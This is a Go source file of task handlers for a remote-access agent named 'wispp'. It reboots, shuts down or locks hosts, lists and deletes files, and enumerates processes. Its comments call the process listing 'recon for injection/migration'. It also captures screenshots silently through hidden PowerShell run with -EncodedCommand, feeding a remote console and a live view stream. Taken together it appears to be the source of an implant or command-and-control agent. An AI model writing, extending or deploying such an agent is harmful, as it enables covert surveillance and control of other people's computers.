// Command handlers for M2 (plan §7-M2). Each returns TaskResult-shaped data;
// main.go wires them into the task dispatcher. Bulk/file-content transfers
// wait for Type3 (M4); screenshots ride Type1 with a size cap for now.
package main

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"sort"
	"strconv"
	"strings"
	"time"
	"unicode/utf16"

	"wispp/protocol"
)

// cmdHost runs computer-management verbs (plan §2.2; best-effort per OS,
// the output carries the exact failing command when privileges are lacking).
func cmdHost(action uint32) protocol.TaskResult {
	var candidates [][]string
	switch action {
	case protocol.CmdHostReboot:
		switch runtime.GOOS {
		case "windows":
			candidates = [][]string{{"shutdown", "/r", "/t", "0"}}
		case "darwin":
			candidates = [][]string{{"osascript", "-e", `tell application "System Events" to restart`}, {"shutdown", "-r", "+0"}}
		default:
			candidates = [][]string{{"systemctl", "reboot"}, {"shutdown", "-r", "now"}}
		}
	case protocol.CmdHostShutdown:
		switch runtime.GOOS {
		case "windows":
			candidates = [][]string{{"shutdown", "/s", "/t", "0"}}
		case "darwin":
			candidates = [][]string{{"osascript", "-e", `tell application "System Events" to shut down`}, {"shutdown", "-h", "+0"}}
		default:
			candidates = [][]string{{"systemctl", "poweroff"}, {"shutdown", "-h", "now"}}
		}
	case protocol.CmdHostLogoff:
		switch runtime.GOOS {
		case "windows":
			candidates = [][]string{{"shutdown", "/l"}}
		case "darwin":
			candidates = [][]string{{"osascript", "-e", `tell application "System Events" to log out`}}
		default:
			candidates = [][]string{{"loginctl", "terminate-user", currentUserName()}}
		}
	case protocol.CmdHostLock:
		switch runtime.GOOS {
		case "windows":
			candidates = [][]string{{"rundll32.exe", "user32.dll,LockWorkStation"}}
		case "darwin":
			candidates = [][]string{{"pmset", "displaysleepnow"}}
		default:
			candidates = [][]string{{"loginctl", "lock-session"}}
		}
	default:
		return fail(fmt.Errorf("host: unknown action %d", action))
	}
	var lastErr error
	var lastOut string
	for _, c := range candidates {
		out, err := exec.Command(c[0], c[1:]...).CombinedOutput()
		if err == nil {
			return ok1(fmt.Sprintf("%s ok", strings.Join(c, " ")))
		}
		lastErr, lastOut = err, strings.TrimSpace(string(out))
	}
	return protocol.TaskResult{OK: false, Exit: 1, Output: fmt.Sprintf("host: all attempts failed (%v): %s", lastErr, lastOut)}
}

func currentUserName() string {
	u := os.Getenv("USER")
	if u == "" {
		u = os.Getenv("USERNAME")
	}
	return u
}

func cmdPwd() protocol.TaskResult {
	cwd, err := os.Getwd()
	if err != nil {
		return fail(err)
	}
	return ok1(cwd)
}

func cmdLs(args json.RawMessage) protocol.TaskResult {
	var a protocol.LsArgs
	if err := json.Unmarshal(args, &a); err != nil {
		return fail(err)
	}
	dir := a.Path
	if dir == "" {
		var err error
		if dir, err = os.Getwd(); err != nil {
			return fail(err)
		}
	}
	ents, err := os.ReadDir(dir)
	if err != nil {
		return fail(err)
	}
	rows := make([]protocol.LsEntry, 0, len(ents))
	for _, e := range ents {
		info, err := e.Info()
		if err != nil {
			continue
		}
		rows = append(rows, protocol.LsEntry{
			Name: e.Name(), Dir: e.IsDir(), Size: info.Size(), MTime: info.ModTime().Unix(),
		})
	}
	sort.Slice(rows, func(i, j int) bool {
		if rows[i].Dir != rows[j].Dir {
			return rows[i].Dir
		}
		return strings.ToLower(rows[i].Name) < strings.ToLower(rows[j].Name)
	})
	b, _ := json.Marshal(map[string]any{"path": dir, "entries": rows})
	return ok1(string(b))
}

func cmdMkdir(args json.RawMessage) protocol.TaskResult {
	var a protocol.MkdirArgs
	if err := json.Unmarshal(args, &a); err != nil {
		return fail(err)
	}
	if a.Path == "" {
		return fail(fmt.Errorf("mkdir: empty path"))
	}
	return wrap(os.MkdirAll(a.Path, 0o755), "ok")
}

func cmdRm(args json.RawMessage) protocol.TaskResult {
	var a protocol.RmArgs
	if err := json.Unmarshal(args, &a); err != nil {
		return fail(err)
	}
	if a.Path == "" || a.Path == "/" || filepath.Clean(a.Path) == "." {
		return fail(fmt.Errorf("rm: refusing %q", a.Path))
	}
	return wrap(os.RemoveAll(a.Path), "ok")
}

// cmdScreenshot captures one frame (platform tool), result JSON carries a
// data: URL so the console can render it inline.
func cmdScreenshot() protocol.TaskResult {
	tmp := filepath.Join(os.TempDir(), fmt.Sprintf("wisp_shot_%d.png", time.Now().UnixNano()))
	defer os.Remove(tmp)

	if err := captureToFile(tmp); err != nil {
		return fail(fmt.Errorf("screenshot: %w", err))
	}
	compressShot(tmp)
	data, err := os.ReadFile(tmp)
	if err != nil {
		return fail(err)
	}
	const cap = 6 << 20
	if len(data) > cap {
		return fail(fmt.Errorf("screenshot too large even after compression (%d bytes)", len(data)))
	}
	mime := "image/png"
	if len(data) > 3 && data[0] == 0xFF && data[1] == 0xD8 {
		mime = "image/jpeg"
	}
	b, _ := json.Marshal(map[string]string{"img": "data:" + mime + ";base64," + base64.StdEncoding.EncodeToString(data)})
	return ok1(string(b))
}

// captureToFile writes one PNG frame to path using the best available platform
// tool; shared by the screenshot task and the Type2 view stream.
func captureToFile(path string) error {
	switch runtime.GOOS {
	case "darwin":
		return exec.Command("screencapture", "-x", "-t", "png", path).Run()
	case "windows":
		p := strings.ReplaceAll(filepath.ToSlash(path), "'", "''")
		ps := fmt.Sprintf(`Add-Type -AssemblyName System.Windows.Forms,System.Drawing;`+
			`$b=[System.Windows.Forms.SystemInformation]::VirtualScreen;`+
			`$bmp=New-Object System.Drawing.Bitmap($b.Width,$b.Height);`+
			`$g=[System.Drawing.Graphics]::FromImage($bmp);`+
			`$g.CopyFromScreen($b.X,$b.Y,0,0,$bmp.Size);`+
			`$bmp.Save('%s');`, p)
		return exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-EncodedCommand", b64UTF16(ps)).Run()
	default:
		var last error
		for _, cmd := range [][]string{
			{"gnome-screenshot", "-f", path},
			{"grim", path},
			{"scrot", "-o", path},
			{"import", "-window", "root", path},
		} {
			if last = exec.Command(cmd[0], cmd[1:]...).Run(); last == nil {
				return nil
			}
		}
		return last
	}
}

// compressShot downscales a capture in place (Retina PNGs of 3-5MB become
// ~200-500KB JPEGs): keeps screenshots/streams inside the Type1 envelope and
// dramatically cheaper on Type2 view channels too.
func compressShot(path string) {
	data, err := os.ReadFile(path)
	if err != nil || len(data) < 15<<20/10 {
		return
	}
	jp := path + ".jpg"
	switch runtime.GOOS {
	case "darwin":
		err = exec.Command("sips", "-Z", "1920", "-s", "format", "jpeg", "-s", "formatOptions", "62", path, "--out", jp).Run()
	case "windows":
		ps := `Add-Type -AssemblyName System.Drawing;` +
			`$i=[System.Drawing.Image]::FromFile('` + path + `');` +
			`$w=[Math]::Min(1920,$i.Width);$h=[Int]($i.Height*$w/$i.Width);` +
			`$b=New-Object System.Drawing.Bitmap($w,$h);` +
			`$g=[System.Drawing.Graphics]::FromImage($b);$g.InterpolationMode='HighQualityBicubic';` +
			`$g.DrawImage($i,0,0,$w,$h);` +
			`$enc=[System.Drawing.ImageFormat]::Jpeg;` +
			`$b.Save('` + jp + `',$enc);$g.Dispose();$b.Dispose();$i.Dispose()`
		err = exec.Command("powershell", "-NoProfile", "-WindowStyle", "Hidden", "-Command", ps).Run()
	}
	if err != nil {
		return
	}
	jd, jerr := os.ReadFile(jp)
	_ = os.Remove(jp)
	if jerr == nil && len(jd) > 0 && len(jd) < len(data) {
		_ = os.WriteFile(path, jd, 0o600)
	}
}

func ok1(out string) protocol.TaskResult {
	return protocol.TaskResult{OK: true, Output: out}
}

func fail(err error) protocol.TaskResult {
	return protocol.TaskResult{OK: false, Exit: 1, Output: err.Error()}
}

func wrap(err error, msg string) protocol.TaskResult {
	if err != nil {
		return fail(err)
	}
	return ok1(msg)
}

// b64UTF16 encodes a string as base64(UTF-16LE) for -EncodedCommand.
func b64UTF16(s string) string {
	units := utf16.Encode([]rune(s))
	b := make([]byte, 0, len(units)*2)
	for _, u := range units {
		b = append(b, byte(u), byte(u>>8))
	}
	return base64.StdEncoding.EncodeToString(b)
}

// cmdPs enumerates processes cross-platform (recon for injection/migration).
// Output: JSON [{pid,ppid,user,rss_kb,name}] sorted by pid.
func cmdPs() protocol.TaskResult {
	type row struct {
		Pid  int    `json:"pid"`
		Ppid int    `json:"ppid"`
		User string `json:"user"`
		Rss  int64  `json:"rss_kb"`
		Name string `json:"name"`
	}
	var rows []row
	switch runtime.GOOS {
	case "windows":
		out, err := exec.Command("tasklist", "/FO", "CSV", "/NH").Output()
		if err != nil {
			return protocol.TaskResult{OK: false, Output: "tasklist: " + err.Error()}
		}
		for _, ln := range strings.Split(string(out), "\n") {
			ln = strings.TrimSpace(ln)
			if ln == "" {
				continue
			}
			f := splitCSV(ln)
			if len(f) < 5 {
				continue
			}
			pid := atoiTail(f[1])
			rows = append(rows, row{Pid: pid, Ppid: 0, User: "-", Rss: 0, Name: f[0]})
		}
	default: // darwin / linux / bsd: ps is universal enough
		out, err := exec.Command("ps", "-axo", "pid=,ppid=,user=,rss=,comm=").Output()
		if err != nil {
			return protocol.TaskResult{OK: false, Output: "ps: " + err.Error()}
		}
		for _, ln := range strings.Split(string(out), "\n") {
			f := strings.Fields(ln)
			if len(f) < 5 {
				continue
			}
			pid, _ := strconv.Atoi(f[0])
			ppid, _ := strconv.Atoi(f[1])
			rss, _ := strconv.ParseInt(f[3], 10, 64)
			rows = append(rows, row{Pid: pid, Ppid: ppid, User: f[2], Rss: rss, Name: strings.Join(f[4:], " ")})
		}
	}
	b, _ := json.Marshal(rows)
	return protocol.TaskResult{OK: true, Output: string(b)}
}

func splitCSV(ln string) []string {
	var out []string
	cur, in := "", false
	for _, r := range ln {
		switch {
		case r == '"':
			in = !in
		case r == ',' && !in:
			out = append(out, cur)
			cur = ""
		default:
			cur += string(r)
		}
	}
	return append(out, cur)
}

func atoiTail(s string) int {
	n := 0
	for _, r := range s {
		if r >= '0' && r <= '9' {
			n = n*10 + int(r-'0')
		}
	}
	return n
}
